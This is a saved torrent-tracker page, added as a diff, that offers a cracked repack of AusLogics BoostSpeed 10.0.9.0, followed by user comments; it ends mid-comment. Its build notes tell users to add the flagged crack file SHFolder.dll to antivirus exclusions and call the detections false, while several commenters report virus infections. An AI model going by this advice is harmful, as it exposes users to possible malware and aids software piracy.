@@ -1,0 +1,473 @@
+<html>
+<head>
+	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
+	<link href="http://s.rutor.info/css.css" rel="stylesheet" type="text/css" media="screen" />
+	<link rel="alternate" type="application/rss+xml" title="RSS" href="/rss.php?category" />
+	<link rel="shortcut icon" href="http://s.rutor.info/favicon.ico" />
+	<title>rutor.info :: AusLogics BoostSpeed 10.0.9.0 [DC 23.04.2018] (2018) РС | RePack &amp; Portable by TryRooM</title>
+	<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/jquery.cookie-min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/t/functions.js"></script>
+	
+</head>
+<body>
+
+<div id="all">
+
+<div id="up">
+
+<div id="logo">
+	<a href="/"><img src="http://s.rutor.info/logo.jpg" alt="rutor.info logo" /></a>
+</div>
+
+<table id="news_table">
+  <tr><td colspan="2"><strong>Новости трекера</strong></td></tr><tr><td class="news_date">30-Дек</td>
+  	<td class="news_title"><a href="http://rutor.info/torrent/472" target="_blank"  id="news88" onclick="$.cookie('news', '88', {expires: 365});">У RUTOR.ORG - Новый Адрес: RUTOR.INFO</a></td></tr><tr><td class="news_date">29-Ноя</td>
+  	<td class="news_title"><a href="/torrent/178905" target="_blank"  id="news86">Вечная блокировка в России</a></td></tr><tr><td class="news_date">09-Окт</td>
+  	<td class="news_title"><a href="/torrent/145012" target="_blank"  id="news59">Путеводитель по RUTOR.org: Правила, Руководства, Секреты</a></td></tr></table>
+  <script type="text/javascript">
+  $(document).ready(function(){if($.cookie("news")<88){$("#news88").css({"color":"orange","font-weight":"bold"});}});
+  </script>
+
+</div>
+
+<div id="menu">
+<a href="/" class="menu_b" style="margin-left:10px;"><div>Главная</div></a>
+<a href="/top" class="menu_b"><div>Топ</div></a>
+<a href="/categories" class="menu_b"><div>Категории</div></a>
+<a href="/browse/" class="menu_b"><div>Всё</div></a>
+<a href="/search/" class="menu_b"><div>Поиск</div></a>
+<a href="/latest_comments" class="menu_b"><div>Комменты</div></a>
+<a href="/upload.php" class="menu_b"><div>Залить</div></a>
+<a href="/jabber.php" class="menu_b"><div>Чат</div></a>
+
+<div id="menu_right_side"></div>
+
+<script type="text/javascript">
+$(document).ready(function()
+{
+	var menu_right;
+	if ($.cookie('userid') > 0)
+	{
+		menu_right = '<a href="/users.php?logout" class="logout" border="0"><img src="http://s.rutor.info/i/viti.gif" alt="logout" /></a><span class="logout"><a href="/profile.php" class="logout"  border="0"><img src="http://s.rutor.info/i/profil.gif" alt="profile" /></a>';
+	}
+	else
+	{
+		menu_right = '<a href="/users.php" class="logout" border="0"><img src="http://s.rutor.info/i/zaiti.gif" alt="login" /></a>';
+	}
+	$("#menu_right_side").html(menu_right);
+});
+</script>
+
+</div>
+<h1>AusLogics BoostSpeed 10.0.9.0 [DC 23.04.2018] (2018) РС | RePack &amp; Portable by TryRooM</h1>
+</div>
+<div id="ws">
+<div id="content">
+
+<center>
+<div id="b_tz_208" class="b_tz_on_top" onmouseup="window.event.cancelBubble=true"></div>
+</center>
+
+
+
+<div id="msg1"></div>
+<script type="text/javascript">
+$(document).ready(function()
+{
+	if ($.cookie('msg') != null)
+	{
+		if ($.cookie('msg').length > 0)
+		{
+			var msg2 = '<div id="warning">' + $.cookie('msg').replace(/["+"]/g, ' ') + '</div>';
+			$("#msg1").html(msg2);
+			$.cookie('msg', '', { expires: -1 });
+		}
+	}
+});
+</script><script type="text/javascript">function toggle_visibility(id) { var e = document.getElementById(id); if(e.style.display == 'block') e.style.display = 'none'; else e.style.display = 'block'; }</script>
+
+
+
+<div id="download">
+<a href="magnet:?xt=urn:btih:f909647410b60b63fd832e7f851db0b995daff76&amp;dn=rutor.info_AusLogics+BoostSpeed+10.0.9.0+%5BDC+23.04.2018%5D+%282018%29+%D0%A0%D0%A1+%7C+RePack+%26+Portable+by+TryRooM&amp;tr=udp://opentor.org:2710&amp;tr=udp://opentor.org:2710&amp;tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/magnet.gif"></a>
+<!--<a href="/mail.php?send_torrent=407536"><img src="http://s.rutor.info/t/mails.png"></a>-->
+<a href="http://d.rutor.info/download/407536"><img src="http://s.rutor.info/t/down.png"> Скачать AusLogics_BoostSpeed_10.0.9.0_DC_23.04.2018_ReP.torrent</a>
+<br />
+<a href="/torrent/141992" class="d_small" target="_blank">Как тут качать?</a>
+<script type="text/javascript">
+function addEngine(){ if (typeof(window.external) != "undefined" && typeof(window.external.AddSearchProvider) != "undefined") { window.external.AddSearchProvider('http://rutor.info/AddSearchProvider.xml'); } else { alert("Извините, чтобы установить плагин поиска, Вы должны использовать браузер Firefox!");}}
+</script>
+<a href="#" class="d_small" onclick="addEngine();">Добавить rutor.info в поисковую строку</a>
+</div>
+
+
+
+
+
+<table width="100%">
+<tr><td colspan="2" style="text-align:center;">
+<script type="text/javascript">
+	var docw = document.body.clientWidth;
+	docw = docw - 270 - 470 - 50;
+	begun1_width = docw;
+	var filelist_already_loaded = 0;
+</script>
+
+</td>
+</tr>
+</table>
+
+
+<table id="details">
+
+<tr><td style="vertical-align:top;"></td><td><br /><hr /><hr /><img src="http://i1.imageban.ru/out/2015/07/12/ab5fbc4bdcf643236b273ce7051eabba.jpg" style="float:right;" /><br />
+<br />
+<br />
+<br />
+<br />
+<li><b>Версия программы</b>: 10.0.9.0<br />
+<li><b>Официальный сайт</b>: <a href="http://www.auslogics.com/en/software/boost-speed/" target="_blank">Auslogics Software</a><br />
+<li><b>Язык интерфейса</b>: Multi / Русский<br />
+<li><b>Лечение</b>: не требуется (инсталлятор уже пролечен) <br />
+<li><b>Тип лекарства</b>: RadiXX11<br />
+<br />
+<br />
+<li><b><u>Системные требования</u></b>:<br />
+<img src="http://s013.radikal.ru/i324/1508/b3/bd532b0f09a3.png" /><br />
+<li>Win 10 (32 or 64 bit), Win 8/8.1 (32 or 64 bit), Win 7 (32 or 64 bit), Vista SP2 (32-bit only), XP SP3 (32-bit only)<br />
+<li>Hard disk space: 60 MB<br />
+<li>Memory: 512 MB<br />
+<li>Recommended screen resolution: 1024x700<br />
+<br />
+<br />
+<li><b><u>Описание</u></b>: <br />
+<i><b>Auslogics BoostSpeed</b></i> - популярный набор инструментов для оптимизации и настройки вашей операционной системы. С помощью этой программы вы сможете значительно оптимизировать работу вашей системы, с легкостью настроить различные параметры Windows, очистить жесткий диск и системный реестр от мусора и ненужных записей, сделать дефрагментацию дисков и реестра, а также оптимизировать скорость интернет-соединения и многое другое.<br />
+<br />
+<br />
+<br />
+<br />
+<hr /><hr /><div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Новые возможности:</div><div class="hidebody"></div><textarea class="hidearea"><li><b>Удобная навигация</b>. Aбсолютно новый интерфейс BoostSpeed 6 позволяет легко управлять программой. Все утилиты и функции быстро доступны. Основные задачи - очистка дисков, исправление ошибок в реестре, а также дефрагментация файлов могут быть выполнены с помощью всего нескольких кликов мышки! Программа отображает текущее состояние компьютера и, в случае необходимости, предлагает выполнить проверку системы.<br />
+<br />
+<li><b>Восстановление файлов</b>. Если Вы случайно удалили нужный файл, документ или фотографию - воспользуйтесь новой утилитой BoostSpeed 5 - File Recovery. Эта программа восстанавливает любые типы файлов, удаленных с жесткого диска, USB-накопителя или карты памяти цифровой камеры. Благодаря функции предварительного просмотра файлов Вы сможете быстро найти и восстановить именно то, что Вам нужно.<br />
+<br />
+<li><b>Поиск ошибок на диске</b>. С помощью этой утилиты Вы можете проверять Ваш жесткий диск на наличие ошибок в файловой системе. В случае обнаружения нечитаемого сектора, Disk Doctor восстанавливает данные, находящиеся в этом секторе и переносит их во вновь выделенный кластер. Таким образом, с помощью этой программы Вы можете контролировать состояние Вашего винчестера, а также предотвратить потерю данных.<br />
+<br />
+<li><b>Обзор дисков</b>. Еще одна новая утилита - Disk Explorer, поможет Вам контролировать использование дискового пространства на винчестере. С помощью этой программы Вы узнаете, какие папки, файлы и типы файлов (видео, музыка, документы и т.д.) занимают больше всего места на Вашем винчестере. Быстро освободить пространство на диске Вам поможет список &quot;Top-100 файлов&quot;, отображающий самые крупные файлы на Вашем диске.</li></li></li></li></textarea></div><div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Основные утилиты Auslogics BoostSpeed:</div><div class="hidebody"></div><textarea class="hidearea">• Disk Cleaner («Обслуживание дисков» - «Очистка»)<br />
+С помощью данной функции можно удалить ненужные файлы, файлы замедляющие компьютер. Инструмент Disk Cleaner осуществляет сканирование системы на наличие файлового мусора, который лежит на диске. К файловому мусору могут быть отнесены: временные файлы, файлы онлайн чат программ, кэш-файлы, временные файлы медиаплееров, временные файлы Java и другие. Если вы не разбираетесь, какие папки нужно сканировать, можете выбрать «Отметить только безопасные». Так вы не удалите нужные файлы для системы.<br />
+<br />
+• Disk Defrag - («Обслуживание дисков» - «Дефрагментация»)<br />
+Этот инструмент производит дефрагментацию дисков, ускоряет процессы чтения, записи на диск, оптимизирует расположение системных файлов. В результате сокращается время отклика приложений, загрузки системы, повышается общая производительность ПК.<br />
+<br />
+• Disk Doctor - («Обслуживание дисков» - «Поиск ошибок»)<br />
+Используя данную утилиту, входящую в Auslogics BoostSpeed, можно проверить жесткий диск на наличие ошибок в файловой системе. Если утилита обнаружит нечитаемый сектор, то она восстановит данные, которые находятся на данном секторе, перенесет во вновь выделенный кластер. С помощью данной утилиты можно контролировать состояние винчестера, предотвратить потерю данных.<br />
+<br />
+• Duplicate File Finder («Освобождение места на дисках» - «Удаление копий»)<br />
+В результате рутинной ежедневной работы на компьютере скапливается много дубликатов файлов. Это может быть как фотографии, так и музыка, документы, различные приложения (файлы установки). Утилита находит и удаляет ненужные дубликаты. Рекомендуется запустить выполнение вначале Duplicate File Finder , а затем только Disk Defrag, так как очистка диска от ненужных файлов ускоряет процесс дефрагментации.<br />
+<br />
+• Disk Explorer («Освобождение места на дисках» - «Обзор дисков»)<br />
+Эта утилита, входящая в Auslogics BoostSpeed, помогает осуществлять строгий контроль за использованием дискового пространства на винчестере. Благодаря Disk Explorer можно узнать какие папки, файлы, типы файлов занимают больше всего места на винчестере. Можно воспользоваться списком &quot;Top-100 файлов&quot;, благодаря которому можно облегчить и упростить себе задачу по поиске самых крупных файлов, по освобождению пространства на жестком диске.<br />
+<br />
+• Startup Manager (“Контроль ПО» - «Автозапуск»)<br />
+Позволяет управлять программами, которые запускаются вместе с Windows, утилита показывает все программы автозапуска на Вашей системе и позволяет отключить редко или почти неиспользуемые программы.<br />
+<br />
+• Uninstall Manager («Контроль ПО» - «Установленное ПО»)<br />
+Данная утилита позволяет легко деинстраллировать любую из установленных программ. Существуют три функции: &quot;Деинсталлировать&quot; - стандартное удаление программы с помощью мастера удаления; &quot;Моментальное удаление&quot; - удаляет программу мгновенно без запуска мастера удаления; &quot;Удалить из реестра&quot; - удаляет записи программы из реестра, если эта программа раннее была удалена некорректно.<br />
+<br />
+• Tweak Manager (“Настройка системы» - «Параметры»)<br />
+Позволяет откорректировать множество малоизвестных настроек Windows, что приведет к ускорению Вашего компьютера. Все настройки имеют подробное описание, что делает их использование простым и понятным.<br />
+<br />
+• File Recovery. («Экстренное восстановление» - «Восстановление файлов»)<br />
+Если вы случайно удалили файл, документ или фотографию, то вы смело можете воспользоваться утилитой File Recovery, входящей в состав Auslogics BoostSpeed. Вы сможете восстановить любые типы файлов, которые были удалены с носителей информации. Применяя функцию быстрого просмотра, вы можете выбрать именно тот файл, который необходимо быстро найти и восстановить.<br />
+<br />
+• Rescue Center («Экстренное восстановление» - «Центр восстановления»)<br />
+Все изменения, которые были произведены программой, сохраняются в Центре Восстановления. Если после работы программы у вас возникнут какие-либо проблемы, то вы сможете легко отменить сделанные «улучшения», привести систему в начальное состояние.<br />
+<br />
+• Registry Cleaner - («Обслуживание реестра» - «Очистка»)<br />
+Ошибки в реестре могут ухудшить производительность системы, привести к зависанию компьютера. Утилита сканирует реестр, ищет неверные или устаревшие данные, исправляет найденные ошибки. Утилиту можно использовать безопасно, все изменения можно легко отменить, воспользовавшись Центром Восстановления.<br />
+<br />
+• Registry Defrag - («Обслуживание реестра» - «Дефрагментация»)<br />
+Auslogics BoostSpeed также включает функцию, предназначенную для дефрагментации реестра, уменьшения использования оперативной памяти. Утилита переписывает реестр, ликвидирует пустые места, исправляет структурные дефекты. Как результат - компактный, хорошо структурированный реестр, который использует меньше ресурсов ПК, требует меньше времени для доступа. Также вы можете ознакомиться с детальным отчетом о проделанной работе.<br />
+<br />
+• System Information («Состояние системы» - «Информация»)<br />
+Благодаря этой утилите, вы можете получить доступ к подробной информации о Вашем компьютере, то есть узнать о конфигурации оборудования, просмотреть информацию о установленной операционной системе, используемых драйверах, программах. Также вы можете сформировать и сохранить отчет в удобном для просмотра формате.<br />
+<br />
+• Task Manager («Состояние системы» - «Диспетчер задач»)<br />
+С помощью этого диспетчера задач можно осуществлять контроль загрузки процессора, памяти. Также вы можете установить какие из процессов могут причинить вред для вашего компьютера. Task Manager позволяет ускорить любой процесс или приложение за счет перераспределения системных ресурсов.<br />
+<br />
+• Services Manager («Состояние системы» - «Службы»)<br />
+На компьютере могут выполняться процессы о которых вы не знаете, никогда ими не пользуетесь. Каждая служба использует ресурсы памяти, процессора, жесткого диска. Если отключить ненужные службы, то можно существенно улучшить быстродействие компьютера.<br />
+<br />
+• File Shredder - («Конфиденциальность» - «Уничтожить файлы»)<br />
+Удаление файлов и папок в Windows удаляет ссылки, но не сами файлы. С помощью данной утилиты можно полностью удалить информацию с винчестера, USB-носителя так, что ее нельзя будет восстановить. Утилита оснащена четырьмя алгоритмами удаления - от быстрого до сверх безопасного.<br />
+<br />
+• Disk Wiper («Конфиденциальность» - «Очистить диски»)<br />
+С помощью этого инструмента можно стереть ранее удаленную обычным способом информацию. Disk Wiper позволяет отключить сервис Восстановления Системы, это гарантия того, что в процессе стирания новые копии файлов создаваться не будут. Эта утилита также может производить очистку концевых кластеров (slack area) и записей в таблицах файловой системы.<br />
+<br />
+• Track Eraser ( «Конфиденциальность» - «Очистить историю»)<br />
+Когда вы используете Интернет для посещения веб-сайтов в Интернете, работаете через браузер с документами, то ваши действия записываются в специальных файлах “cookie”, временных файлах Интернета и в реестре Windows. Если посторонние люди получать доступ к вашему компьютеру, то смогут извлечь информацию о том, какие сайты вы посещали, какие документы, программы вы использовали. Эта утилита, входящая в состав Auslogics BoostSpeed, удалит данную информацию, защитит ваши конфиденциальные данные от передачи третьим лицам.<br />
+<br />
+• Internet Optimizer («Ускорение Интернета» - «Автоматическое» и «Ручная настройка»)<br />
+Internet Optimizer позволяет произвести настройку более сотни параметров, чтобы достигнуть максимальной производительности системы и скорости соединения через Интернет.</textarea></div><div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">История версий:</div><div class="hidebody"></div><textarea class="hidearea"><b>10.0.9.0</b><br />
+Made changes to the way PC status is reported after cleanup so it&#039;s now more convenient to read.<br />
+Improved program stability.<br />
+Resolved issues with the way program windows looked on high resolution displays.<br />
+Resolved an issue related to scheduling Registry Defrag operations.<br />
+Fixed a few minor bugs.<br />
+<br />
+<b><a href="http://www.auslogics.com/en/software/boost-speed/popup/history/" target="_blank">Version History</a></b></textarea></div><div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Особенности сборки:</div><div class="hidebody"></div><textarea class="hidearea"><b><i><span style="color:brown;">Антивирусы ругаются и удаляют файл shfolder.dll, добавьте его в исключения, иначе программа не будет активирована.</span></i></b><br />
+<br />
+<b>5 / 67</b> 5 engines detected this file https://www.virustotal.com/#/file/f48938da51f8cb22602f60300babf7edc466c3c96862731d19c7fb0227fe36b6/detection<br />
+<br />
+<b>Тип</b>: установка, распаковка (Portable by TryRooM).<br />
+<b>Языки</b>: Multi/Русский<br />
+<b>Лечение</b>: не требуется, Patch RadiXX11.<br />
+<b>Вырезано</b>: eula, GoogleAnalyticsHelper.<br />
+<br />
+<b>В портативной версии</b> можно отключить установку Patch от RadiXX11.<br />
+<li>Читаем Readme.<br />
+<li>вложены ключи для активации</li></li></textarea></div><hr /><hr /><br />
+<center><a href="http://radikal.ru/fp/5n113aybl2bcb" target="_blank"><img src="https://b.radikal.ru/b34/1803/ab/a9e85effcf85t.jpg" /></a> <a href="http://radikal.ru/fp/v50ln9kiel773" target="_blank"><img src="https://d.radikal.ru/d09/1803/6e/c1f6b425442ft.jpg" /></a> <a href="http://radikal.ru/fp/7htrqyz9jsfzl" target="_blank"><img src="https://b.radikal.ru/b00/1803/4a/6093c06833d5t.jpg" /></a> <a href="http://radikal.ru/fp/uzsgmqmm3wc06" target="_blank"><img src="https://c.radikal.ru/c06/1803/45/c32c9c270c74t.jpg" /></a></center><hr /><hr /><br />
+<font size="3"><b><span style="color:red;">ВНИМАНИЕ!!!</span> <span style="color:green;">Возможно ЛОЖНОЕ срабатывание антивирусов на &quot;лекарство&quot;</span> <span style="color:blue;">(файл SHFolder.dll).</b></font></span><hr /><hr /></li></li></li></li></li></li></li></li></li></li></li></td></tr>
+
+<tr><td class="header">Оценка</td><td>8.8 из 10 (34 голосов, самая низкая оценка - 1, самая высокая - 10)</td></tr>
+<tr><td class="header">Категория</td><td><a href="/soft" target="_blank">Софт </a></td></tr>
+<tr><td class="header">Раздают</td><td>12</td></tr>
+<tr><td class="header">Качают</td><td>1</td></tr>
+<tr><td class="header">Сидер замечен</td><td>09-05-2018 5:19:06 (55 минут назад)</td></tr>
+<tr><td class="header">Добавлен</td><td>08-05-2018 15:49:32  (14 часа назад)</td></tr>
+<tr><td class="header">Размер</td><td>19.84&nbsp;MB  (20808775 Bytes)</td></tr>
+
+<tr>
+	<td class="header" nowrap="nowrap">Добавить в</td>
+	<td style="vertical-align:middle;"><span class="fake_link" onclick="add_bookmark($(this), 407536);">закладки</span></td>
+</tr>
+
+<tr><td colspan="2"><div id="index"><fieldset style="border: 1px solid #3C95D1;"><legend style="font-weight: bold;">Связанные раздачи</legend><table width="100%"><tr class="backgr"><td width="10px">Добавлен</td><td colspan="2">Название</td><td width="1px">Размер</td><td width="1px">Пиры</td></tr><tr class="gai"><td>20&nbsp;Апр&nbsp;18</td><td ><a class="downgif" href="http://d.rutor.info/download/535947"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:fc6b065ba2abc7a5f6b47015df0efa5888508779&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/535947/auslogics-boostspeed-10.0.9.0-2018-rs">AusLogics BoostSpeed 10.0.9.0 (2018) РС </a></td> <td align="right">22<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">20.13&nbsp;MB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;6</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr></table><div style="width: 100%; text-align: right; margin-top: 4px; margin-bottom: -5px;"><a href="/search/0/9/0/0/BoostSpeed" target="_blank">Искать ещё похожие раздачи</a></div></fieldset></div></td></tr>
+
+<tr><td class='header'><span onclick="if(filelist_already_loaded==0){filelist_already_loaded=1;$('#filelist').load('/descriptions/407536.files');}toggle_visibility('displayfiles');" class="button"><u>Файлы (4)</u></span></td><td>
+<div id="displayfiles" style="display:none;max-height:450px;overflow:auto;">
+<table id="files">
+<tr><td>Название</td><td>Размер</td></tr>
+<tbody id="filelist"><tr><td colspan="2" style="text-align:center;">Происходит загрузка списка файлов...</td></tr></tbody>
+</table>
+</div>
+</td></tr>
+
+</table>
+<br />
+<br />
+
+<script type="text/javascript">
+var bookmarked = 0;
+function add_bookmark(me, id)
+{
+	if (bookmarked == 0)
+	{
+		$.ajax({
+	  type: "POST",
+		url: "/bookmarks.php",
+	  data: "access_method=ajax&action=add_bookmark&torrent_id=" + id,
+	  success: function(res){
+	  		if (res == 0)
+	  		{
+	  			me.html('Зайдите на трекер!');
+	  			me.css({"color":"red"});
+	  		}
+	  		else if (res == 3)
+	  		{
+	  			me.html('Закладка добавлена!');
+	  			me.css({"color":"green"});
+	  		}
+	  		else if (res == 2)
+	  		{
+	  			me.html('Такая закладка у Вас уже существует!');
+	  			me.css({"color":"orange"});
+	  		}
+	  		else if (res == 5)
+	  		{
+	  			me.html('Ограничение численности закладок достигнуто!');
+	  			me.css({"color":"red"});
+	  		}
+  		}
+ 		});
+	}
+	bookmarked++;
+}
+$(document).ready(function() {
+	if ($.cookie('userid') > 0) {
+		$("#cem").append(' | <a href="/edit.php?edit=407536">Редактировать</a>');
+		if (typeof torrent_moderate == typeof Function && $.cookie('class') >= 6) {
+			$("#cem").append('<br /><span onClick="torrent_moderate(407536);">Промодерировать раздачу</span> | <span onclick="confirm_delete(407536);">Удалить</span>');
+		}
+	}
+});
+</script>
+
+
+<strong>
+<div style="text-align: center;" id="cem"><a href="/comment/407536">Написать комментарий</a>
+
+
+</div>
+</strong>
+
+<br/><br/>
+<script type="text/javascript">
+<!--
+function confirmation(delete_comment) {
+	var answer = confirm("Удалить комментарий?")
+	if (answer){
+		window.location = "/comment.php?delete_comment=" + delete_comment;
+	}
+}
+//-->
+</script>
+	<script type="text/javascript"><!--
+	function confirmation(delete_comment) {
+		var answer = confirm("Удалить комментарий?")
+		if (answer){
+			window.location = "/comment.php?delete_comment=" + delete_comment;
+		}
+	}
+	function cOptions(userid, cid) {
+	var cstr = 'c_' + cid;
+	var c_url = '<a href="/comment.php?edit_comment=' + cid + '"><img src="http://s.rutor.info/t/c_edit.png"></a><a onClick=confirmation(' + cid + ')><img  src="http://s.rutor.info/t/c_delete.png"></a>';
+	if (userid == getCookie('userid') || getCookie('class') >= 5)
+		document.getElementById(cstr).innerHTML = c_url;
+}
+//-->
+</script>
+	<table width="100%" cellspacing="0" cellpadding="4"><tr class="c_h"><td><b>Niky33</b></td> <td>08-05-2018 21:18:57 (9 часов назад)</td> <td></td> <td align="right"><span id="c_3199563"></span><script type="text/javascript">cOptions(1491197,3199563);</script></td></tr><tr><td class="c_t" colspan=4><fieldset style="border: 1px dashed black;"><legend>Цитата</legend><b>Кто-то</b> писал:<br />пришлось переустанавливать 2 раза в итоге купил лицензионный ключ (3) за 800 р</fieldset><br />
+Дело вообще-то хозяйское, но к чему такой извращенный садомазохизм? Пардоньте. Не проще было поставить Kerish Doktor, работа которого много лучше и ключик в два раза дешевле</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>-=DoMiNo=-</b></td> <td>07-05-2018 15:31:12 (2 дня назад)</td> <td></td> <td align="right"><span id="c_3199065"></span><script type="text/javascript">cOptions(805410,3199065);</script></td></tr><tr><td class="c_t" colspan=4><b><a href="http://sendfile.su/1387283" target="_blank">AusLogics BoostSpeed 5.5.1.0 RePack (&amp; Portable) by elchupakabra (Upd. 12.07.2015)</a></b></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Pashtetgt2</b></td> <td>07-05-2018 13:40:17 (2 дня назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_3199034"></span><script type="text/javascript">cOptions(403982,3199034);</script></td></tr><tr><td class="c_t" colspan=4>10 версия ну полное &quot;Г&quot; откатился на 5ю версию! Как можно было так загубить прогу ) <br />
+За прогу 0 за репак 10!</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>kosta 105</b></td> <td>21-02-2018 19:03:04 (3 месяца назад)</td> <td>Оценил на: <b>8</b></td> <td align="right"><span id="c_3157213"></span><script type="text/javascript">cOptions(799571,3157213);</script></td></tr><tr><td class="c_t" colspan=4>Ну после 5-й версии пожалуй они как то свернули с пути. Пуск на W10-ке ломает, еще чего то там крашит. Перестал пользоваться ей совсем, проблемы с системой пропали. Вероятно потому как я активно использую софт и тестирую его в огромных количествах, а ауслоджик.. ну да ладно, это все домыслы. Главное факт - перестал использовать и не стало проблем. Забавно да? Нет.  Тем не менее, тем кто на 7-ке достаточно и 5-го буста.<br />
+<br />
+И вообще. Незаменимых нет. Софт норм. Только разошлись дорожки как бас с бочкой. Ремонтировать надо понимаючи и родными ключами идущими в комплекте.</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Alekc_rut</b></td> <td>13-01-2018 14:55:14 (4 месяца назад)</td> <td></td> <td align="right"><span id="c_3132281"></span><script type="text/javascript">cOptions(1524640,3132281);</script></td></tr><tr><td class="c_t" colspan=4>Компания AusLogics BoostSpeed  скорее всего начала сотрудничать с теми кто выкладывает эти проги, поэтому с 10 версии пошла такая неразбериха. В связи с тем , что прога хорошая а систему пришлось переустанавливать 2 раза купил лицензионный ключ (3) за 800 р  и теперь не парюсь все работает прекрасно.</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>druid1</b></td> <td>12-01-2018 15:48:01 (4 месяца назад)</td> <td></td> <td align="right"><span id="c_3131687"></span><script type="text/javascript">cOptions(1295371,3131687);</script></td></tr><tr><td class="c_t" colspan=4>Домино дал ссылку на пятую версию. На десятке она работает. Если кто будет пользоваться, повнимательней отнеситесь к чистке реестра, может пропасть кнопка &quot;пуск&quot;. Мне она нравилась, когда ещё была разделена на две, второй значок был котелок(шляпа).</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Keeneclipse</b></td> <td>12-01-2018 13:55:15 (4 месяца назад)</td> <td></td> <td align="right"><span id="c_3131622"></span><script type="text/javascript">cOptions(698961,3131622);</script></td></tr><tr><td class="c_t" colspan=4>Здорово. Спасибо огромное!</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>dybrik13</b></td> <td>12-01-2018 10:54:42 (4 месяца назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_3131548"></span><script type="text/javascript">cOptions(1493867,3131548);</script></td></tr><tr><td class="c_t" colspan=4><img src="http://s.rutor.info/t/smilies/respect1.gif" /> <img src="http://s.rutor.info/t/smilies/thankyou.gif" /></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>dezzy5</b></td> <td>26-12-2017 12:22:45 (4 месяца назад)</td> <td></td> <td align="right"><span id="c_3121868"></span><script type="text/javascript">cOptions(383435,3121868);</script></td></tr><tr><td class="c_t" colspan=4>Schtechel репак от чупакабры-полет нормальный</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Schtechel</b></td> <td>26-12-2017 10:05:42 (4 месяца назад)</td> <td>Оценил на: <b>1</b></td> <td align="right"><span id="c_3121807"></span><script type="text/javascript">cOptions(576694,3121807);</script></td></tr><tr><td class="c_t" colspan=4>При запуске показывает ошибку в BrowserHelper.dll. И всё! Стабильная 8.1.1.0.</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Niky33</b></td> <td>15-07-2017 18:07:19 (10 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_3027599"></span><script type="text/javascript">cOptions(1491197,3027599);</script></td></tr><tr><td class="c_t" colspan=4><img src="http://s.rutor.info/t/smilies/thankyou.gif" /></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>tndm89</b></td> <td>07-06-2017 20:29:03 (11 месяц назад)</td> <td></td> <td align="right"><span id="c_3008452"></span><script type="text/javascript">cOptions(1492558,3008452);</script></td></tr><tr><td class="c_t" colspan=4><b>Scorpio13666</b>, дело в том что после использованния данной программы, появились не понятные процессы в диспетчере задач, которые подгружали проц, пришлось чистить реестр , удалять в планировщике заданий новые задачи, и проверять на вирусы, вот на все это ушло укало 3х часов , это не стоит того, до 9.0й версии все было нормально, версии выше сплошные вирусы, хоть от дьякова, хоть от кролика, по этому стал юзать рег органайзер </td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Scorpio13666</b></td> <td>29-05-2017 7:16:37 (11 месяц назад)</td> <td></td> <td align="right"><span id="c_3002718"></span><script type="text/javascript">cOptions(1492828,3002718);</script></td></tr><tr><td class="c_t" colspan=4>tndm89 2017 год на дворе, а Вы ещё не знаете что любой взлом это по сути вирус. Если это Вас пугает, так не скачивайте, а покупайте.</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>tndm89</b></td> <td>26-05-2017 13:35:04 (12 месяца назад)</td> <td>Оценил на: <b>1</b></td> <td align="right"><span id="c_3001224"></span><script type="text/javascript">cOptions(1492558,3001224);</script></td></tr><tr><td class="c_t" colspan=4>вся в вирусах, не советую качать не от дьякова, не от кролика<br />
+<br />
+<br />
+<b><a href="http://rutor.is/torrent/139014/" target="_blank">Правила поведения в комментариях трекера и на форуме!</a></b><br />
+<span style="color:#0000ff;">Пункт 16. При обнаружении вируса в материале презентации обязательно добавляйте в комментарий чёткий скриншот срабатывания антивируса! На одни слова положительной реакции от персонала не будет, ибо написать можно всё что угодно.</span> </td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Sydar</b></td> <td>23-05-2017 12:56:45 (12 месяца назад)</td> <td>Оценил на: <b>3</b></td> <td align="right"><span id="c_2999485"></span><script type="text/javascript">cOptions(1492298,2999485);</script></td></tr><tr><td class="c_t" colspan=4>Аваст тут же удаляет exe под видом вируса. <br />
